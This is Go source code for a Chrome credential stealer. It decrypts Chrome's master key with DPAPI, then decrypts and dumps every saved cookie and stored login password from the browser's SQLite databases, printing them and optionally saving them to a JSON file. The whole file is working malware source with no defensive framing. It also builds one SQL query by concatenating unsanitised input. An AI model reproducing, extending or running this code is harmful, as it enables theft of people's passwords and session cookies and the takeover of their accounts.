package main

import (
	_ "github.com/mattn/go-sqlite3"
    "encoding/base64"
	"database/sql"
    "encoding/json"
    "io/ioutil"
    "log"
    "os"
	"strings"
	"fmt"
	"crypto/aes"    
	"crypto/cipher"

    "github.com/zavla/dpapi"
)

var masterKey []byte
var chromePath string = strings.Replace(os.Getenv("APPDATA") + "\\Google\\Chrome\\User Data", "Roaming", "Local", -1)
func getMasterKey(path string) ([]byte, error) {
	var masterKey []byte
    if _, err := os.Stat(path); os.IsNotExist(err) {
        return masterKey, err
    }

    content, err := ioutil.ReadFile(path)
    if err != nil {
        return masterKey, err
    }

    if !strings.Contains(string(content), "os_crypt") {
        return masterKey, fmt.Errorf("Invalid content")
    }

    var localState struct {
        OsCrypt struct {
            EncryptedKey string `json:"encrypted_key"`
        } `json:"os_crypt"`
    }

    if err := json.Unmarshal(content, &localState); err != nil {
        return masterKey, err
    }

    encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
    if err != nil {
        return masterKey, err
    }
    masterKey = encryptedKey[5:]
    decryptedKey, err := dpapi.Decrypt(masterKey)
    if err != nil {
        return masterKey, err
    }

    return decryptedKey, nil
}

func DecryptPassword(buff []byte, masterKey []byte) string {
    iv := buff[3:15]
    payload := buff[15:]
    block, _ := aes.NewCipher(masterKey)
    gcm, _ := cipher.NewGCM(block)
    decryptedPass, _ := gcm.Open(nil, iv, payload, nil)
    return string(decryptedPass)
}
func ChromeDumpCookies()([]Cookie, error){
	var cookies []Cookie
	cookiePath := chromePath + "\\Default\\Network\\Cookies"
	if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
		return cookies, err
    }
	db, err := sql.Open("sqlite3", cookiePath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var name string
		var value []byte
		err = rows.Scan(&host, &name, &value)
		if err != nil {
			return cookies, err
		}
		decrypted := DecryptPassword(value, masterKey)
		cookie := Cookie{name, decrypted, host}
		cookies = append(cookies, cookie)
	}
	return cookies, nil
}
func ChromeCrackCookies(web string)([]Cookie, error){
	var cookies []Cookie
	cookiePath := chromePath + "\\Default\\Network\\Cookies"
	if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
		return cookies, err
    }
	db, err := sql.Open("sqlite3", cookiePath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies where host_key like '%" + web + "%'")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var name string
		var value []byte
		err = rows.Scan(&host, &name, &value)
		if err != nil {
			return cookies, err
		}
		decrypted := DecryptPassword(value, masterKey)
		cookie := Cookie{name, decrypted, host}
		cookies = append(cookies, cookie)
	}
	return cookies, nil
}
func ChromeCrackCredentials() ([]Credential, error){
	var credentials []Credential
	credPath := chromePath + "\\Default\\Login Data"
	if _, err := os.Stat(credPath); os.IsNotExist(err) {
		return credentials, err
    }
	db, err := sql.Open("sqlite3", credPath)
	if err != nil {
		return credentials, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return credentials, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var username string
		var password []byte
		err = rows.Scan(&host, &username, &password)
		if err != nil {
			return credentials, err
		}
		decrypted := DecryptPassword(password, masterKey)
		credential := Credential{host, username, decrypted}
		credentials = append(credentials, credential)
	}
	return credentials, nil
}

func ChromeStealer(host string, output string, dumpAll bool, check bool){
	key, err := getMasterKey(chromePath + "\\Local State")
	masterKey = key
	if err != nil{
		log.Fatal(err)
	}

	var cookies []Cookie
	if dumpAll{
		cookies, err = ChromeDumpCookies()
	}else{
		cookies, err = ChromeCrackCookies(host)
	}
	if err != nil{
		log.Fatal(err)
	}
	for _, cookie := range cookies{
		fmt.Printf("%s @ %s - %s\n", cookie.Host, cookie.Name, cookie.Value)
	}

	credentials, err := ChromeCrackCredentials()
	if err != nil{
		log.Fatal(err)
	}
	for _, cred := range credentials{
		fmt.Printf("%s @ %s - %s\n", cred.Host, cred.Username, cred.Password)
	}

	if len(output) != 0{
		data := Data{cookies, credentials}
		jsonData, err := json.MarshalIndent(data, "", "	")
		if err != nil {
			log.Fatal("Error saving credentials into JSON file:", err)
			return
		}
		if !strings.Contains(strings.ToLower(output), "json"){
			fmt.Printf("Please provide a file that has .json extension, continue writing to %s anyway...\n", output)
		}
		fmt.Printf("Saving all result to %s\n", output)
		err = ioutil.WriteFile(output, jsonData, 0644)
		if err != nil {
			log.Fatal(err)
		}
	}
}